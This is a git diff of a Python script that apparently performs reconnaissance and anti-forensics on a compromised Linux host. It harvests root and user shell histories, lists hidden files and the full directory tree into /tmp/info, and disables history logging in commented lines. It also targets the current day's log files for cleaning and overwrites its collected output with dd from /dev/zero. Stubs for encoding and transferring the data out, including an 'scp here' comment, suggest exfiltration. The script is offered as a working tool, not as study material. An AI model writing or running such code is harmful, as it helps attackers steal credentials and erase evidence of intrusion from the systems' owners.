@@ -88,7 +88,7 @@ def preLim():
     #result=bashCmd("unset HISTFILE",1)
     #result=bashCmd("unset HISTSIZE",1)
     #result=bashCmd("unset HISTFILESIZE",1)
-    result=bashCmd("/root/Desktop/hist.sh")
+    #result=bashCmd("/root/Desktop/hist.sh")
 
 
 ##########################################
@@ -117,7 +117,7 @@ def nextStuff():
     try:
         every.append(bashCmd("atq"),1)
     except:
-        print("no atq")
+        pass # print("no atq")
     every.append(bashCmd("cat /root/.bash_history /home/*/*history"))
     every.append(bashCmd("find / -type f -name \".*\""))
     every.append(bashCmd("find / -type d -name \".*\""))
@@ -129,7 +129,7 @@ def nextStuff():
     try: 
         result=bashCmd("ulimit -c",1)
         every.append("ulimit -c: "+result)
-    except: print("no ulimit")
+    except: pass # print("no ulimit")
     
     w2File(bashCmd("ls -laR /home"),"homeTree")
     w2File(bashCmd("ls -laR / "),"fullTree")
@@ -144,24 +144,27 @@ def nextStuff():
 ##########################################
 ## functions
 
-def bashCmd(cmd,i=0):
-    if (i==0):    
-        cmd2=cmd.split()
-        result=subprocess.run(cmd2,stdout=subprocess.PIPE,stderr=subprocess.PIPE).stdout.decode('utf-8')
+def bashCmd(cmd,i=0):    
+    cmd2=cmd.split()
+    if(i==0):
+        result=subprocess.run(cmd2,stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE).stdout.decode('utf-8')
     else:
-        result=subprocess.call(cmd,shell=True)
+        result=subprocess.run(cmd2,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True).stdout.decode('utf-8')
     return result; #cmd,result);
 
 def w2File(result,filename,i=0):
     if(i==0):
         with open("/tmp/info/"+filename,'a') as f:
             print(result,file=f)
-            print("--------------------------------------------------",file=f)
+            sep="------------------------------------"
+            print(sep+sep+sep,file=f)
         #for r in result:
         #    print(r[0],"\n",r[1],file=f)
     else:
         with open("/tmp/info/"+filename,'w') as f:
             print(result,file=f)
+
 def xferFile():
     # encode and gzip, then xfer
     # uuencode -m <file to encode>
@@ -171,18 +174,23 @@ def xferFile():
 def logClean():
     try:
         today=datetime.now()
-        months=["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"]
-        logs=bashCmd("ls -latr /var/logs | grep "+"\""+months[today.month]+ " "+today.day+"\"")
+        months=["Jan","Feb","Mar","Apr","May","Jun",
+                "Jul","Aug","Sep","Oct","Nov","Dec"]
+        logs=bashCmd("ls -latr /var/logs | grep "
+                +"\""+months[today.month]+ " "+today.day+"\"")
         logsToClean=logs.split("\n")
-        for i in range(0,len(logsToClean)):
-            #subprocess.call("/tmp/info/logClean.py -f "+logsToClean[i]+ " -s "+ phrase)
-            print(logsToClean[i])
+        #for i in range(0,len(logsToClean)):
+        #    print(logsToClean[i])
     except:
         pass
-    files=bashCmd("ls -latr /tmp/info")
-    files2=files.split("\n")
-    for i in files2:
-        w2File(bashCmd("/dev/zero > "+i))
+    files=bashCmd("ls /tmp/info")
+    files2=files.split()
+    print(files2)
+    for i in range(0,len(files2)):
+        ###############################################scp here!!
+        size=bashCmd("ls -latr /tmp/info/"+files2[i]).split()    
+        bashCmd("dd if=/dev/zero of=/tmp/info/"+files2[i]+
+                " bs=1 count="+size[4])
         # remove file
 
 ##########################################
@@ -191,6 +199,6 @@ if not os.path.exists('/tmp/info'):
     os.makedirs('/tmp/info')
 
 preLim()
-nextStuff()
+#nextStuff()
 #xferFile()
 logClean()
